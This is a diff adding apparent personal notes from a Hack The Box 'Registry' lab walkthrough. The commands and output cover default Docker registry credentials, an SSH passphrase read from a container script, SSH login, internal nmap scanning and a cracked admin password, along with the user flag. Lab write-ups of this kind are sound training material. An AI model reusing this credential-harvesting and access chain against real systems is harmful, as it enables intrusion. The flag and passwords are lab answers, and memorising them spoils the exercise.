@@ -1,0 +1,217 @@
+
+root@kali:~/HTB/Registry# sslscan 10.10.10.159 Version: 1.11.13-static OpenSSL 1.0.2-chacha (1.0.2g-dev)
+
+Connected to 10.10.10.159
+
+Testing SSL server 10.10.10.159 on port 443 using SNI name 10.10.10.159
+
+  TLS Fallback SCSV:
+Server supports TLS Fallback SCSV
+
+  TLS renegotiation:
+Session renegotiation not supported
+
+  TLS Compression:
+Compression disabled
+
+  Heartbleed:
+TLS 1.2 not vulnerable to heartbleed
+TLS 1.1 not vulnerable to heartbleed
+TLS 1.0 not vulnerable to heartbleed
+
+  Supported Server Cipher(s):
+Preferred TLSv1.2  256 bits  ECDHE-RSA-AES256-GCM-SHA384   Curve P-384 DHE 384
+Preferred TLSv1.1  256 bits  ECDHE-RSA-AES256-SHA          Curve P-384 DHE 384
+Preferred TLSv1.0  256 bits  ECDHE-RSA-AES256-SHA          Curve P-384 DHE 384
+
+  SSL Certificate:
+Signature Algorithm: sha256WithRSAEncryption
+RSA Key Strength:    2048
+
+Subject:  docker.registry.htb
+Issuer:   Registry
+
+Not valid before: May  6 21:14:35 2019 GMT
+Not valid after:  May  3 21:14:35 2029 GMT
+
+
+https://docker.registry.htb/v2
+admin:admin
+
+catalog
+http://docker.registry.htb/v2/_catalog
+
+get tls cert
+
+root@kali:~/HTB/Registry# wget http://10.10.10.159/install/ -O install
+--2019-10-27 09:33:11--  http://10.10.10.159/install/
+Connecting to 10.10.10.159:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [text/html]
+Saving to: ‘install’
+
+install                              [ <=>                                                      ]   1.03K  --.-KB/s    in 0s      
+
+2019-10-27 09:33:12 (34.4 MB/s) - ‘install’ saved [1050]
+
+root@kali:~/HTB/Registry# file install
+install: gzip compressed data, last modified: Mon Jul 29 23:38:20 2019, from Unix, original size 167772200
+root@kali:~/HTB/Registry/www2# 7z x install
+
+docker instructions to work with tls cert
+https://docs.docker.com/engine/security/certificates/
+
+root@kali:~/HTB/Registry# docker login docker.registry.htb
+Authenticating with existing credentials...
+WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
+Configure a credential helper to remove this warning. See
+https://docs.docker.com/engine/reference/commandline/login/#credentials-store
+
+Login Succeeded
+
+
+root@kali:~/HTB/Registry/www2# docker pull docker.registry.htb/bolt-image
+Using default tag: latest
+latest: Pulling from bolt-image
+f476d66f5408: Pull complete 
+8882c27f669e: Pull complete 
+d9af21273955: Pull complete 
+f5029279ec12: Pull complete 
+2931a8b44e49: Pull complete 
+c71b0b975ab8: Pull complete 
+02666a14e1b5: Pull complete 
+3f12770883a6: Pull complete 
+302bfcb3f10c: Pull complete 
+Digest: sha256:eeff225e5fae33dc832c3f82fd8b0db363a73eac4f0f0cb587094be54050539b
+Status: Downloaded newer image for docker.registry.htb/bolt-image:latest
+root@kali:~/HTB/Registry/www2# docker images
+REPOSITORY                       TAG                 IMAGE ID            CREATED             SIZE
+docker.registry.htb/bolt-image   latest              601499e98a60        5 months ago        362MB
+kalilinux/kali-linux-docker      latest              f26f3ae90aee        12 months ago       1.57GB
+root@kali:~/HTB/Registry/www2# docker run -it docker.registry.htb/bolt-image
+root@115c40f9fd6b:/# ls -a
+.  ..  .dockerenv  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
+
+root@1ca470d8b287:~# cat /etc/profile.d/01-ssh.sh
+#!/usr/bin/expect -f
+#eval `ssh-agent -s`
+spawn ssh-add /root/.ssh/id_rsa
+expect "Enter passphrase for /root/.ssh/id_rsa:"
+send "GkOcz221Ftb3ugog\n";
+expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
+interact
+root@1ca470d8b287:~# 
+
+root@kali:~/HTB/Registry# ssh -i id_rsa bolt@registry.htb
+Enter passphrase for key 'id_rsa': 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)
+
+  System information as of Sun Oct 27 14:36:26 UTC 2019
+
+  System load:  0.44              Users logged in:                1
+  Usage of /:   5.8% of 61.80GB   IP address for eth0:            10.10.10.159
+  Memory usage: 45%               IP address for br-1bad9bd75d17: 172.18.0.1
+  Swap usage:   3%                IP address for docker0:         172.17.0.1
+  Processes:    189
+Last login: Sun Oct 27 14:35:19 2019 from 10.10.15.141
+bolt@bolt:~$ cat user.txt
+ytc0ytdmnzywnzgxngi0zte0otm3ywzi
+
+bolt@bolt:~$ ifconfig
+br-1bad9bd75d17: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
+        inet6 fe80::42:5bff:fe43:78a6  prefixlen 64  scopeid 0x20<link>
+        ether 02:42:5b:43:78:a6  txqueuelen 0  (Ethernet)
+        RX packets 169426  bytes 1695773485 (1.6 GB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 138972  bytes 10267825 (10.2 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
+        ether 02:42:22:49:5b:12  txqueuelen 0  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.10.10.159  netmask 255.255.255.0  broadcast 10.10.10.255
+        inet6 dead:beef::250:56ff:feb9:6ba6  prefixlen 64  scopeid 0x0<global>
+        inet6 fe80::250:56ff:feb9:6ba6  prefixlen 64  scopeid 0x20<link>
+        ether 00:50:56:b9:6b:a6  txqueuelen 1000  (Ethernet)
+        RX packets 495523  bytes 67812049 (67.8 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 744007  bytes 745109266 (745.1 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 57048  bytes 1691939672 (1.6 GB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 57048  bytes 1691939672 (1.6 GB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+veth28b92bd: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet6 fe80::63:94ff:fe36:7812  prefixlen 64  scopeid 0x20<link>
+        ether 02:63:94:36:78:12  txqueuelen 0  (Ethernet)
+        RX packets 169426  bytes 1698145449 (1.6 GB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 138987  bytes 10268971 (10.2 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+bolt@bolt:~$ 
+
+bolt@bolt:~/fuckoff$ nmap -p- 172.18.0.0/24
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2019-10-28 07:50 UTC
+Nmap scan report for bolt (172.18.0.1)
+Host is up (0.00016s latency).
+Not shown: 65531 closed ports
+PORT     STATE    SERVICE
+22/tcp   open     ssh
+80/tcp   open     http
+443/tcp  open     https
+4444/tcp filtered krb524
+
+Nmap scan report for 172.18.0.2
+Host is up (0.00016s latency).
+Not shown: 65534 closed ports
+PORT     STATE SERVICE
+5000/tcp open  upnp
+
+Nmap done: 256 IP addresses (2 hosts up) scanned in 7.15 seconds
+
+bolt@bolt:/var/www/html$ ls -la
+total 28
+drwxrwxr-x  4 www-data www-data 4096 Oct 21 08:41 .
+drwxr-xr-x  4 root     root     4096 May 26 21:06 ..
+-rw-r--r--  1 root     root       85 May 25 21:27 backup.php
+-rw-------  1 git      www-data    0 Oct  8 21:54 .bash_history
+drwxrwxr-x 11 www-data www-data 4096 Oct 21 08:27 bolt
+-rwxrwxr-x  1 www-data www-data  612 May  6 17:23 index.html
+-rw-r--r--  1 root     root      612 Oct 21 08:41 index.nginx-debian.html
+drwxr-xr-x  2 root     root     4096 Sep 26 21:13 install
+bolt@bolt:/var/www/html$ cat .bash_history
+cat: .bash_history: Permission denied
+bolt@bolt:/var/www/html$ cat backup.php
+<?php shell_exec("sudo restic backup -r rest:http://backup.registry.htb/bolt bolt");
+bolt@bolt:/var/www/html$ 
+
+put backup.registry.htb in hosts file and goto url
+
+interesting file at /var/www/html/bolt/app/database/bolt.db
+
+
+bolt@bolt:/var/www/html/bolt/app/database$ python -c "import sqlite3;print(sqlite3.connect('/var/www/html/bolt/app/database/bolt.db').cursor().execute('SELECT * FROM bolt_users'))"
+<sqlite3.Cursor object at 0x7fb9abf3fe30>
+
+cracked hash from bolt.db
+"strawberry"
+
+login registry.htb/bolt/bolt/login
+admin:strawberry
+
+
